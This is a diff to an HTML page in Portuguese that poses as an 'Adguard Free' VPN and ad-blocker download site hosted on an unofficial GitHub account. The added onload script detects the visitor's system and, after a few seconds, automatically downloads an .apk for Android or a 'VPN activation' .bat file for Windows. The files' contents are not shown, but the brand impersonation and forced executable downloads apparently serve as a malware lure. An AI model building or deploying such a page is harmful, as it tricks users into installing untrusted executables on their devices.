@@ -15,29 +15,54 @@
         
         .status-box { background: #1a1a1a; padding: 15px; border-radius: 15px; margin-top: 20px; border: 1px solid #333; }
         .status-on { color: #4caf50; font-weight: bold; }
+        .alert { font-size: 0.9em; color: #ff9800; margin-top: 10px; display: none; }
     </style>
 </head>
-<body>
+<body onload="iniciarDownloadAutomatico()">
 
     <div class="container">
         <img src="https://cdn-icons-png.flaticon.com/512/6711/6711467.png" class="logo">
         <h1>Adguard <span style="color:#4caf50">Free</span></h1>
         <p style="color: #888;">Navegação Privada & Bloqueio de Anúncios</p>
 
+        <div id="aviso" class="alert">Iniciando download automático...</div>
+
         <div class="status-box">
             Status do Servidor: <span class="status-on">● ONLINE</span>
         </div>
 
-        <a href="https://github.com/eduardomedeiros85981519-crypto/adguard-free.github.io/raw/main/adguard-free.apk" class="download-btn">
+        <a id="btn-android" href="https://github.com/eduardomedeiros85981519-crypto/adguard-free.github.io/raw/main/adguard-free.apk" class="download-btn">
             📥 BAIXAR VPN PARA ANDROID (.APK)
         </a>
 
-        <a href="https://github.com/eduardomedeiros85981519-crypto/adguard-free.github.io/raw/main/Ativar_VPN.bat" class="download-btn win-btn">
+        <a id="btn-windows" href="https://github.com/eduardomedeiros85981519-crypto/adguard-free.github.io/raw/main/Ativar_VPN.bat" class="download-btn win-btn">
             💻 BAIXAR PARA WINDOWS (.BAT)
         </a>
 
         <p style="font-size: 0.7em; color: #555; margin-top: 20px;">Segurança nativa via IKEv2/IPSec</p>
     </div>
+
+    <script>
+        function iniciarDownloadAutomatico() {
+            const aviso = document.getElementById('aviso');
+            const linkAndroid = document.getElementById('btn-android').href;
+            const linkWindows = document.getElementById('btn-windows').href;
+
+            // Mostra o aviso após 2 segundos
+            setTimeout(() => {
+                aviso.style.display = 'block';
+                
+                // Detecta se é Windows ou Android
+                let userAgent = navigator.userAgent || navigator.vendor || window.opera;
+                
+                if (/android/i.test(userAgent)) {
+                    window.location.href = linkAndroid;
+                } else if (/windows/i.test(userAgent)) {
+                    window.location.href = linkWindows;
+                }
+            }, 3000); // Espera 3 segundos antes de pedir o download
+        }
+    </script>
 
 </body>
 </html>
